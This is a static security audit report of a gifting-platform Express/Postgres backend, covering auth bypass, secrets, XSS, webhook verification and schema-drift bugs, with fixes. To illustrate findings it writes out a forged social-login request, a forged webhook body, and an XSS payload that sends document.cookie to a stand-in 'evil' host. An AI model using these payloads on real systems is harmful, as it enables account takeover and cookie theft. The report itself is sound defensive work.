# Backend Audit — Phase 2: Deep Security & Correctness Review

**Repo:** Kado / Ehdy gifting platform backend (`ehdy-backend`)
**Scope:** Deep evaluation of the Phase 1 targets. Static analysis only — no code changed, no
runtime executed, no live DB queried. All "this breaks in prod" claims are static inferences and
are marked as needing runtime confirmation where relevant.
**Date:** 2026-07-08
**Companion:** [AUDIT_PHASE1.md](AUDIT_PHASE1.md) (structure & map)

---

## Executive Summary

The application layer is reasonably well-structured (parameterized SQL everywhere, DB-fetched roles,
`SELECT ... FOR UPDATE` on the money path, per-user scoping in the wallet), but it is the **only**
line of defense — there is no Row-Level Security, and one Postgres superuser credential backs the
whole system. That design amplifies several real holes into critical ones. **Top 3 risks:**
(1) `POST /v1/auth/social-login` is a full authentication bypass — the OAuth `id_token` is never
verified, so anyone can mint tokens for any email; (2) a single `JWT_SECRET` (placeholder in the
committed `.env`) signs user, merchant, and admin tokens, so one leaked/guessed secret = instant
admin; (3) core redemption is very likely broken — `redemptionService` still `INSERT`s into the
`transactions` table that migration 014 dropped, which rolls back every redemption of a claimed
gift. Add a stored-XSS hole on the public gift page and a Tap webhook that skips signature
verification when the key is unset, and the security posture is fragile.
**Maturity score: 4/10** — good instincts and clean layering on the user/merchant surface, but
undermined by an auth bypass, secret management that fails open, a broken core flow from schema
drift, weak/absent validation on the admin surface, and no defense-in-depth below the app.

---

## 1. Row-Level Security & Data Access (table by table)

**Bottom line: there is no RLS anywhere.** A repo-wide search for `ENABLE ROW LEVEL SECURITY` /
`CREATE POLICY` returns zero hits. There is therefore no `using (true)` to flag — there are simply
*no policies at all*. Every table is fully exposed to whatever the app does, and the app connects as
the Postgres **superuser** (`DB_USER=postgres`, [config/database.js:8](src/config/database.js#L8)).
Access is **not** exposed through a Supabase/PostgREST anon key — the only network path to the DB is
the Express process — so the practical blast radius is "any endpoint missing an auth check," not
"anonymous internet reads the table." But because there is no second layer, a single missing check is
a direct, total breach.

Per-table review of the app-layer authorization that *substitutes* for RLS:

| Table | App-layer scoping | Verdict |
|---|---|---|
| `users` | `authenticate` re-fetches by `id`; self-updates keyed on `req.userId` | OK |
| `wallet_items` | Every read/write filters `wi.user_id = $userId` ([walletService.js:112](src/services/walletService.js#L112),[:146](src/services/walletService.js#L146),[:164](src/services/walletService.js#L164)) | OK — no IDOR |
| `gifts_sent` | Filtered by `sender_user_id`/`recipient_user_id` in user-facing reads | OK |
| `gift_instances` | Redemption scoped by `merchant_id` match (below); public page by share code | OK-ish |
| `redemption_events` | Merchant reads filtered by `redeemed_by_merchant_id`/`merchant_id` | OK |
| `merchant_users` | `authenticateMerchant` fetches by `id`, `role`/`branch_id` from DB | OK |
| `admin_users` | `authenticateAdmin` fetches by `id`; **but** `GET /admin/admins` lists all admins to any admin | Weak (see 2) |

- **[High] No RLS / no least-privilege DB role.** The app is the sole gatekeeper and holds superuser.
  *Fix:* create a dedicated application role (`NOLOGIN`-derived login role) with grants limited to the
  tables/columns it needs; stop connecting as `postgres`. As a genuine second layer, enable RLS on
  `users`, `wallet_items`, `gifts_sent`, `gift_instances`, `redemption_events`, `merchant_users`,
  `admin_users` and set `app.current_user_id` / `app.current_merchant_id` via `SET LOCAL` inside
  `withTransaction`, with policies keyed on those. This is a large change; the least-privilege role is
  the high-value first step.
- **[Medium] Cross-merchant redemption is correctly blocked** — `validateRedemptionCode` and
  `confirmRedemption` both reject when `instance.merchant_id !== merchantId`
  ([redemptionService.js:50](src/services/redemptionService.js#L50),[:124](src/services/redemptionService.js#L124)).
  Good. Note the code space is `XXXX-XXXX` (8 alphanumerics); brute-force is bounded by
  `redemptionLimiter` (20 / 5 min) — acceptable but not generous margin.

---

## 2. Auth & Authorization

- **[Critical] `POST /v1/auth/social-login` is an authentication bypass.**
  [authService.js:333-368](src/services/authService.js#L333-L368). The handler comment says *"In
  production, you would verify the id_token"* and then trusts `req.body.email` outright. The validator
  only checks `provider ∈ {google,apple}` and `id_token` non-empty
  ([validators.js:44-47](src/utils/validators.js#L44-L47)) — the token is never sent to Google/Apple.
  **Attack:** `POST /v1/auth/social-login {"provider":"google","id_token":"anything","email":"victim@x.com"}`
  returns valid access + refresh tokens for `victim@x.com`, or silently creates the account with
  `is_email_verified=TRUE` if it doesn't exist. This is a full account-takeover primitive for any
  known email.
  *Fix:* verify the `id_token` server-side before trusting any claim — `google-auth-library`
  `verifyIdToken({ idToken, audience })` for Google; verify Apple's JWT against Apple's JWKS and check
  `aud`/`iss`/`exp`. Derive the email from the *verified* token payload, never from the request body.
- **[Critical] One `JWT_SECRET` signs all three identity classes.**
  User/refresh tokens ([authService.js:22](src/services/authService.js#L22),[:31](src/services/authService.js#L31)),
  merchant tokens, and admin tokens ([admin.js:43-47](src/routes/admin.js#L43-L47)) are all signed with
  the same secret; only a `type` claim distinguishes them. The `type` checks themselves are correct
  (`authenticateMerchant`/`authenticateAdmin` reject wrong-type tokens, and role is re-read from the DB
  — [auth.js:111](src/middleware/auth.js#L111),[:164](src/middleware/auth.js#L164),[:168-177](src/middleware/auth.js#L168-L177)),
  so there is no cross-class confusion *given a secret an attacker doesn't have*. The problem is the
  secret: Phase 1 found the committed `.env` uses the placeholder
  `your-super-secret-jwt-key-change-in-production`, and nothing at boot rejects it. If that value is
  live, any attacker forges `{adminId, type:'admin', role:'superadmin'}` and owns the CMS.
  *Fix:* rotate to a long random secret injected from a secret store; **use distinct secrets per
  audience** (user vs merchant vs admin); add a startup assertion that refuses to boot if
  `JWT_SECRET` is missing or equals a known placeholder (envalid/zod schema).
- **[High] Admin login is the least-protected login.** `POST /v1/admin/login`
  ([admin.js:12](src/routes/admin.js#L12)) has **no `authLimiter`** (only the global 100/15min) and
  **no `express-validator`** (inline `if (!email || !password)`), while user and merchant logins get
  `authLimiter` (10/15min) + validators
  ([auth.js:95](src/routes/auth.js#L95), [merchantPortal.js:40](src/routes/merchantPortal.js#L40)).
  The most privileged credential is the easiest to brute-force. *Fix:* add `authLimiter` and
  `adminLoginValidation` (already defined but unused) to the admin login route; consider a stricter
  per-account lockout.
- **[High] The entire admin mutation surface has no request validation.**
  [routes/admin.js](src/routes/admin.js) is 879 lines of inline handlers; none of them use the
  `admin*Validation` chains that exist in [validators.js:71-122](src/utils/validators.js#L71-L122).
  Bodies flow straight into SQL params (parameterized, so not injection) but with no type/shape/URL/
  UUID checks — e.g. `POST /admin/merchants` accepts arbitrary `logo_url`, `website_url`, etc. On the
  most privileged surface this is the wrong default. *Fix:* wire the existing validators into every
  admin route, or (better) refactor admin onto the controller/service pattern used everywhere else
  (Phase 1 §Architecture).
- **[Medium] `GET /v1/admin/admins` leaks the admin roster to any admin.**
  [admin.js:842-851](src/routes/admin.js#L842-L851) has no `role === 'superadmin'` gate, unlike
  `POST /admins` ([admin.js:857](src/routes/admin.js#L857)). A lowest-privilege admin can enumerate all
  admin emails/roles/last-login. *Fix:* gate the list behind superadmin, or at minimum drop it to
  non-sensitive fields.
- **[High] Unauthenticated open email relay.** `GET /test-email/:to`
  ([index.js:122-131](src/index.js#L122-L131)) sends a real email to any address, no auth, no rate
  limit, sitting outside `/v1/` so even the general limiter doesn't apply. Reputation/abuse vector.
  *Fix:* delete it.
- **[Medium] No token revocation or refresh rotation.** 7-day refresh tokens, no `jti`, no blocklist;
  a stolen token is valid until expiry and logout is client-only. *Fix:* add a `jti` + Redis
  denylist, rotate refresh tokens on use, revoke on password reset.
- **[Low] Dead admin bootstrap code.** `adminService.setupInitialAdmin` / `getSetupStatus`
  ([controllers/adminController.js:8-17](src/controllers/adminController.js#L8-L17)) exist but the
  controller/service are **not mounted** anywhere (the live router is `routes/admin.js`). Not exploitable
  today, but it's a public self-service admin-creation flow one `app.use` away from being live. *Fix:*
  delete the dead controller/service or, if kept, ensure the bootstrap route can never be mounted in prod.

---

## 3. Secrets & Key Exposure

- **[Critical] Placeholder/real secrets in the working-tree `.env`.** Reaffirmed from Phase 1:
  placeholder `JWT_SECRET`/`JWT_REFRESH_SECRET`, plus a live Postgres superuser password, Tap secret,
  Resend and VerifyWay keys. *Fix:* rotate everything, move to a secret manager, add startup validation.
  (No `@supabase/supabase-js` service-role key exists here — the "service key in client path" question
  is N/A; the superuser DB credential is the equivalent and worse.)
- **[High] Tap webhook signature verification fails *open*.**
  [webhooks.js:15-41](src/routes/webhooks.js#L15-L41): `verifyTapSignature` returns `true` when
  `TAP_SECRET_KEY` is unset, and `tap.js` defaults `secretKey` to `''`
  ([config/tap.js:4](src/config/tap.js#L4)). If the key is ever missing in an environment, **anyone can
  POST a forged `{"id":"<pending charge id>","status":"CAPTURED"}` to `/v1/webhooks/tap` and fulfil a
  gift without paying.** Mitigating factor: fulfilment looks the gift up by `tap_charge_id` and uses the
  *stored* amount, so an attacker must know/guess a real pending charge id — but the fail-open default
  is still wrong. Also note the HMAC compares attacker-controlled `hashstring` via
  `crypto.timingSafeEqual` against a fixed-length digest; if `hashstring` is not valid hex or a
  different length, `Buffer.from(x,'hex')`/`timingSafeEqual` **throws**, which is caught and logged as a
  failure (safe) — acceptable but worth a length guard. *Fix:* make a missing key a hard startup error
  in production; never `return true`.
- **[Medium] Verification codes written to logs in plaintext.**
  [authService.js:116](src/services/authService.js#L116) logs `Email verification code for <email>:
  <code>` at `info`. Anyone with log access can verify accounts / (combined with `/forgot-password`)
  approach reset flows. *Fix:* drop the code from logs (or gate behind a dev-only flag).
- **[Medium] Error responses leak raw internal messages.**
  [errorHandler.js:34,104-122](src/middleware/errorHandler.js#L34): `message = err.message` is returned
  to the client for *any* error, including un-wrapped `pg` errors. A thrown DB error surfaces text like
  `relation "transactions" does not exist` to the caller. Stack traces are correctly withheld in prod,
  but the message is not. *Fix:* for non-`AppError` 500s, return a generic message and log the detail
  server-side only.
- **[Medium] CORS reflects origin with credentials and honors a wildcard.**
  [index.js:71-89](src/index.js#L71-L89): if `CORS_ORIGIN` contains `*`, the callback returns
  `callback(null, true)` for *any* origin while `credentials: true` is set — the browser will then send
  cookies cross-origin. The admin JWT lives in a non-`httpOnly` cookie (Phase 1 §1.5), so a wildcard
  CORS + credentials config is dangerous. No-origin requests are always allowed (needed for mobile, but
  note it). *Fix:* never combine `*` with credentials; keep an explicit allowlist.
- **[Medium] TLS without certificate validation in prod.**
  `ssl: { rejectUnauthorized: false }` ([config/database.js:13,25](src/config/database.js#L13)) —
  encrypted but MITM-able. *Fix:* pin the Supabase CA and set `rejectUnauthorized: true`.

---

## 4. Input Validation & Injection

- **SQL injection: not present in the parameterized paths.** All service/route SQL uses `$n` params;
  the security test suite even asserts malicious strings land in the params array, not the SQL text
  ([tests/security/security.test.js:157-214](tests/security/security.test.js#L157-L214)).
- **[Low] String-interpolated `INTERVAL` in admin analytics.**
  [admin.js:726,733,739,748,757,766](src/routes/admin.js#L726) build `INTERVAL '${days} days'` where
  `days = parseInt(range)`. `parseInt` neutralizes injection, but a non-numeric `range` yields
  `INTERVAL 'NaN days'` → a 500 with a leaked message (see §3). Same pattern via
  `getVisitAnalytics(id, days)`. *Fix:* pass the interval as a parameter (`NOW() - ($1 || ' days')::interval`)
  and validate `range` as a bounded int.
- **[High] Stored XSS on the public gift page via merchant branch data.**
  [giftPage.js:132-139](src/routes/giftPage.js#L132-L139) builds `branchesJson` with `JSON.stringify`
  and injects it *inside an inline `<script>`* at [giftPage.js:665](src/routes/giftPage.js#L665)
  (`var branches = ${branchesJson};`). `JSON.stringify` does **not** escape `</script>` or `<!--`. A
  merchant branch whose `name`/`address`/`city` contains `</script><script>fetch('//evil/'+document.cookie)</script>`
  breaks out of the script context and executes on the victim's browser when they open
  `/gift/:shareCode`. Branch fields are merchant-controlled (merchant portal / admin) and the page is
  public and unauthenticated. The text-context interpolations on this page *are* correctly escaped via
  `escapeHtml` (sender/recipient/message/merchant/item names), so this is the one gap. *Fix:* escape
  `<`/`>`/`&`/`U+2028`/`U+2029` in the JSON (`JSON.stringify(x).replace(/</g,'\\u003c')…`), or emit the
  data in a `<script type="application/json">` block and `JSON.parse` its `textContent`, or set a
  strict CSP without `'unsafe-inline'` on this route.
- **[Low] QR data URI injected unescaped into `src`.**
  [giftPage.js:586](src/routes/giftPage.js#L586) (`<img src="${qrUrl}">`). Server-generated data URI,
  low risk, but inconsistent with the `escapeHtml` used one line up for the code. *Fix:* escape it too.
- **[Medium] Whole routes with no validation middleware.** `/gifts/initiate-payment`,
  `/confirm-payment`, `/drafts*` ([gifts.js:185-189](src/routes/gifts.js#L185-L189)) and every admin
  mutation route (§2) run with no `express-validator`. `initiateGiftPayment` does its own amount checks
  (`>0`, `≤10000` — [giftService.js:511-512](src/services/giftService.js#L511-L512)), but
  `personal_message`/`recipient_name`/`theme` are unbounded/unchecked here (the draft path caps
  `personal_message` at 500, the payment path does not). *Fix:* add validators to these routes; cap
  free-text lengths everywhere they're accepted.
- **[Low] Redemption code format enforced inconsistently.** `validateRedemptionValidation` requires
  `^[A-Z0-9]{4}-[A-Z0-9]{4}$` but `confirmRedemptionValidation` only requires non-empty
  ([validators.js:215-230](src/utils/validators.js#L215-L230)). *Fix:* apply the same regex on confirm.

---

## 5. Correctness & Bugs

- **[Critical — verify against live DB] Redemption writes to a table that was dropped.**
  [redemptionService.js:206-219](src/services/redemptionService.js#L206-L219) `INSERT`s into
  `transactions` whenever the gift has a `wallet_owner_id`, but
  [014_drop_dead_tables.sql:8](src/migrations/014_drop_dead_tables.sql#L8) does
  `DROP TABLE IF EXISTS transactions CASCADE`. The insert runs inside `withTransaction`, so if the
  table is gone the whole `confirmRedemption` transaction **rolls back** — the `gift_instances` update
  and the `redemption_events` row included. Net effect: **every redemption of a gift that has been
  claimed into a wallet fails**, while unclaimed gifts (no `wallet_owner_id`) still redeem. Migration
  drift (Phase 1) means I can't confirm 014 ran, but the recent commit history shows migrations 015/016
  applied, so 014 almost certainly did. This is the single most important thing to test on the real DB.
  *Fix:* delete the `transactions` insert (the `redemption_events` row already covers the audit trail,
  and `GET /admin/transactions` reads from `redemption_events` —
  [admin.js:666-706](src/routes/admin.js#L666-L706)).
- **[High — verify] Wallet queries use the dead `gift_cards` model and will hide Tap-fulfilled gifts.**
  [walletService.js:51-54](src/services/walletService.js#L51-L54) and
  [:107-110](src/services/walletService.js#L107-L110) `JOIN gift_cards gc ON gc.id = gi.gift_card_id`
  (INNER) and `JOIN merchants m ON m.id = gc.merchant_id`. But the live Tap flow,
  `fulfillGiftFromTap`, inserts `gift_instances` with `merchant_item_id`/`custom_credit_merchant_id`
  and **never sets `gift_card_id`** ([giftService.js:681-700](src/services/giftService.js#L681-L700)).
  Those instances have `gift_card_id IS NULL`, so the INNER JOIN drops them — a recipient's wallet would
  show **nothing** for gifts bought through the real payment path. The redemption path already moved to
  the new model (`merchant_items` + `custom_credit_merchant_id`,
  [redemptionService.js:12-33](src/services/redemptionService.js#L12-L33)), so `walletService` is stale.
  If the mobile app reads its wallet via these endpoints (rather than `getReceivedGifts`, which *does*
  use the new model — [giftService.js:435-463](src/services/giftService.js#L435-L463)), the wallet is
  broken. *Fix:* rewrite `walletService` onto `merchant_items`/`custom_credit_*` like `getReceivedGifts`
  and `redemptionService`; confirm which endpoint the app actually calls.
- **[Medium] Duplicate `wallet_items` rows can double-fire redemption side effects.** The
  `GIFT_INSTANCE_SELECT` `LEFT JOIN wallet_items` ([redemptionService.js:31](src/services/redemptionService.js#L31))
  assumes one wallet item per instance. If two exist (the `ON CONFLICT DO NOTHING` inserts rely on a
  unique constraint that I could not verify), `validateRedemptionCode` returns `rows[0]` arbitrarily and
  `confirmRedemption` locks `FOR UPDATE OF gi` only — the wallet-owner branch could run against a
  duplicate. *Fix:* confirm a unique constraint on `wallet_items(gift_instance_id)` (or `(user_id,
  gift_instance_id)`), and aggregate rather than assume single.
- **[Medium] `socialLogin` new-user creation has a race / leaks on conflict.**
  [authService.js:346-354](src/services/authService.js#L346-L354): check-then-insert with no unique
  handling. Two concurrent first-logins for the same email → the second violates the `users.email`
  unique constraint and throws a raw 500 (message leaked per §3). *Fix:* `INSERT ... ON CONFLICT
  (email) DO UPDATE ... RETURNING`. (Moot until the token is verified per §2.)
- **[Low] `claimPendingGiftsForPhone` runs a query per pending gift in a loop**
  ([authService.js:175-186](src/services/authService.js#L175-L186)) — correctness fine, N+1 (see §8).

---

## 6. Error Handling & Resilience

- **[High] Admin login brute-force** (no `authLimiter`) — see §2.
- **[Medium] Webhook processing is fire-and-forget with no reconciliation.**
  [webhooks.js:47-95](src/routes/webhooks.js#L47-L95) returns `200` immediately, then does the real work
  in `setImmediate`. A crash/restart between the ack and `fulfillGiftFromTap` **silently drops
  fulfilment** — the customer paid, no gift instance is created, and Tap won't retry (it got its 200).
  The `payment_webhooks` row is logged *after* processing, so a mid-processing crash logs nothing.
  *Fix:* persist the raw webhook first, ack, then process from the persisted record with a
  retry/reconciliation worker (there's a Bull dependency already available) that re-drives any
  `processed = false` rows and any `paid`-in-Tap-but-`pending`-locally gifts.
- **[Medium] No timeouts or retries on external calls.** VerifyWay (`fetch` at
  [authService.js:379](src/services/authService.js#L379),
  [redemptionService.js:332](src/services/redemptionService.js#L332)) and Tap (via `paymentService`)
  have no `AbortController`/timeout; a hung upstream ties up the request. *Fix:* wrap external calls with
  a timeout and a small bounded retry with backoff.
- **[Medium] Redis fails open to a per-process in-memory store — in production.**
  [config/redis.js:64-68](src/config/redis.js#L64-L68) falls back to an in-memory `Map` on any connect
  error, with no environment guard (the log says "development only" but nothing enforces it). Effects if
  Redis is down in prod: OTP/verification/reset codes are stored in one process's memory (unreadable by
  other instances behind a load balancer → verification appears broken), and there's no shared state.
  `index.js` also swallows the Redis failure at boot and continues
  ([index.js:192-196](src/index.js#L192-L196)). *Fix:* in production, make Redis a hard dependency (fail
  startup if unavailable); never silently use the in-memory store there.
- **[Low] Global 10 MB JSON body limit** ([index.js:92](src/index.js#L92)) is a broad DoS surface for a
  JSON API. *Fix:* drop to ~100 KB globally, raise only where needed.
- **[Low] `/gift/:shareCode` sits outside the `/v1/` rate-limited namespace.** Share codes are 12 chars
  (`tokenGenerator`), so enumeration is bounded, but the public page has no limiter at all and does 2 DB
  queries per hit. *Fix:* mount a limiter on `/gift`.
- **Good:** `unhandledRejection`/`uncaughtException` handlers and graceful shutdown are present
  ([index.js:263-275](src/index.js#L263-L275)); the money path uses `SELECT ... FOR UPDATE` inside a
  transaction; `authenticate` re-validates the identity row on every request.

---

## 7. Data Integrity

- **[High] Invariants live only in app code.** No triggers, no DB functions, no RLS, no check that a
  redemption can't exceed balance beyond the single balance `CHECK` (Phase 1). Balance math, state
  transitions, and fulfilment are all JS. The one place it matters most — concurrent redemption — is
  handled correctly via row locks, but everything else is hope. *Fix:* add DB-level guards for the core
  invariants (non-negative balance, single fulfilment per `gifts_sent`, single active `wallet_items`
  per instance).
- **[Medium] Schema drift makes the migrations untrustworthy** (Phase 1 §Data layer): duplicate `009`,
  out-of-band "run in SQL editor" DDL not recorded in `_migrations`, and `001` describing tables later
  dropped. The dropped-`transactions` bug in §5 is a direct symptom. *Fix:* reconcile the live schema
  (`pg_dump --schema-only`) against `migrations/`, rebuild an authoritative baseline, and record every
  applied change.
- **[Medium] FK/cascade behavior not fully audited.** `DROP TABLE ... CASCADE` in 014 silently removed
  dependent objects; the current FK/`ON DELETE` graph wasn't verified against the code's assumptions
  (e.g., soft-delete via `deleted_at` on `users`/`merchants` vs hard `DELETE` on `categories`
  [admin.js:551-559](src/routes/admin.js#L551-L559), which will FK-fail if merchants reference the
  category). *Fix:* audit FK actions; make category delete a soft-delete or guard on references.
- **Could not verify:** the unique constraint backing `wallet_items ... ON CONFLICT DO NOTHING`
  (§5). If absent, `ON CONFLICT DO NOTHING` is a silent no-op that can't dedupe and duplicates slip in.

---

## 8. Performance

- **[Medium] Admin `GET /admin/gifts` is a heavy aggregate per page.**
  [admin.js:591-625](src/routes/admin.js#L591-L625): 5 LEFT JOINs + `GROUP BY gs.id, u.email` +
  `string_agg(DISTINCT ...)` + several `SUM/BOOL_OR` over `gift_instances`, on every listing page. Fine
  now, slow as `gifts_sent`/`gift_instances` grow. *Fix:* ensure `gift_instances(gift_sent_id)` is
  indexed; consider a materialized summary.
- **[Low] Admin list endpoints don't clamp `limit`.** They use raw `parseInt(limit)` with no max
  (e.g. [admin.js:143](src/routes/admin.js#L143),[:565](src/routes/admin.js#L565)), unlike the
  user-facing `buildPagination` which clamps to 100. An admin can request `limit=100000` and pull huge
  result sets. *Fix:* route admin lists through `buildPagination` too.
- **[Low] `claimPendingGiftsForPhone` N+1** ([authService.js:175-186](src/services/authService.js#L175-L186))
  — 2 writes per pending gift in a loop. Batch into a single `UPDATE ... FROM` / `INSERT ... SELECT`.
- **Could not verify (no live DB):** indexes on hot filter/join columns — `gifts_sent(tap_charge_id)`
  (webhook lookup), `gifts_sent(unique_share_link)` (public page), `gift_instances(redemption_code)`
  (redemption), `wallet_items(user_id)`, `gift_instances(redeemed_by_merchant_id)`. These are the
  queries that must be indexed; confirm against the real schema.

---

## 9. Dependencies & Testing

- **[Medium] Dependency hygiene / audit gap.** Pinned-ish but aging majors (express 4.18, helmet 7,
  jsonwebtoken 9). CI has no `npm audit`/secret scanning (Phase 1). Several **unused heavy deps** inflate
  the attack surface and install size: `stripe`, `twilio`, `@sendgrid/mail`, `bull` (declared, minimal/no
  live use per Phase 1). *Fix:* run `npm audit` in CI; remove genuinely-dead deps.
- **Testing — what's covered:** the security suite is genuinely good for JWT attacks (expired, wrong
  secret, tampered payload, `alg:none`, deleted user), parameterized-query structure, pagination
  clamping, sensitive-field stripping, and error non-leakage
  ([tests/security/security.test.js](tests/security/security.test.js)).
- **[High] Riskiest untested paths.** None of the actual holes in this report are covered:
  - `socialLogin` token verification (the §2 bypass) — no test asserts the token is validated.
  - Tap webhook signature verification, including the fail-open-when-no-key branch (§3).
  - `confirmRedemption` end-to-end — would immediately catch the dropped-`transactions` break (§5).
  - Wallet reads against Tap-fulfilled instances (the §5 `gift_cards` mismatch).
  - Admin authorization (superadmin gating, admin login rate limiting).
  The integration/auth suite needs a real DB and is excluded from CI, so the RLS-adjacent and money
  paths — the ones that matter — have the least automated coverage. *Fix:* add a Postgres service to CI
  and cover these five paths first.

---

## Prioritized Remediation Roadmap

Work top-down; each block is roughly independent.

**P0 — do before anything else ships (auth & money integrity):**
1. **Fix the social-login bypass** — verify Google/Apple `id_token` server-side; derive email from the
   verified payload only. (§2)
2. **Rotate all secrets** and set a real, unique `JWT_SECRET` per audience from a secret store; add a
   startup env-schema check that refuses placeholders/missing vars. (§2, §3)
3. **Remove the `transactions` insert** in `redemptionService` and verify redemption end-to-end on the
   live DB. (§5)
4. **Delete `GET /test-email/:to`.** (§2)
5. **Make the Tap webhook fail closed** — hard error if `TAP_SECRET_KEY` is missing in prod; never
   `return true`. (§3)

**P1 — high-impact security & correctness:**
6. Add `authLimiter` + validation to admin login; wire the existing validators into every admin route
   (or refactor admin to controllers/services). (§2)
7. Fix the gift-page `</script>` XSS in `branchesJson`. (§4)
8. Fix/rewrite `walletService` onto the `merchant_items`/`custom_credit_*` model and confirm which
   endpoint the app calls. (§5)
9. Persist-then-process the Tap webhook with a reconciliation worker. (§6)
10. Stop returning raw error messages to clients; make Redis a hard dependency in prod. (§3, §6)

**P2 — defense-in-depth & hygiene:**
11. Introduce a least-privilege application DB role (stop using `postgres`); then evaluate RLS on the
    seven user/tenant tables. (§1)
12. Lock CORS (no `*`+credentials), enable TLS cert validation, shrink the JSON body limit, rate-limit
    `/gift`, stop logging verification codes. (§3, §6)
13. Reconcile the schema/migrations into an authoritative baseline; audit FK/cascade actions; confirm
    the `wallet_items` unique constraint and the hot-path indexes. (§7, §8)
14. Add CI: `npm audit` + secret scan + a Postgres service; add tests for the five untested critical
    paths; remove dead deps and dead code (`src/public/admin`, Stripe path, dead admin controller). (§9)

---

## Could Not Verify / Assumed

- **Whether migration 014 actually ran on production** — the dropped-`transactions` break (§5) is a
  live outage if it did, dormant if not. Not verifiable without querying the real DB; recent commits
  (015/016 applied) make "it ran" the strong assumption.
- **Which endpoint the mobile app uses for the wallet** — `walletService` (broken for Tap gifts) vs
  `getReceivedGifts` (correct). The §5 wallet finding's severity depends on this; assumed the wallet
  endpoints are still in use because they're mounted and non-trivial.
- **Existence of the `wallet_items` unique constraint** backing `ON CONFLICT DO NOTHING`, and the
  hot-path indexes in §8 — require the live schema (`pg_dump`), not available in a static read.
- **Whether `TAP_SECRET_KEY` is set in the real environment** — determines if the webhook fail-open
  (§3) is currently exploitable. Assumed it *is* set (so this is latent), but the default is wrong.
- **Whether the committed `.env` reflects production** — if prod injects a real `JWT_SECRET`
  out-of-band, the §2/§3 secret criticals downgrade to "dangerous default." Assumed representative
  (Phase 1 rationale: `DATABASE_URL` points at a live host).
- **`npm audit` results / concrete CVEs** — not run in this static pass; flagged as a CI gap.
- **Runtime behavior generally** — no code executed, no endpoints hit, no DB inspected. Every
  "this breaks" is a static inference to be confirmed by running the specific flow.
